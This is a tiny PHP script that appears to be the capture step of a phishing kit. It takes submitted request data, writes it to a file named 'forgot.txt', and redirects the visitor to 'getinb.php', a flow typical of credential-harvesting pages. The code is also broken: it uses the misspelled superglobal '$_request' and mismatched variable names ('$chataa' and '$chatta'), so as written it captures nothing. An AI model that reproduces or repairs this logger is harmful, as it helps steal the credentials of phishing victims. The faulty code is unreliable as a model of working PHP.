<?php
$chataa=$_request;
$script="<script>location.href='./getinb.php'</script>";
file_put_contents("forgot.txt",$chatta);
print $script;
?>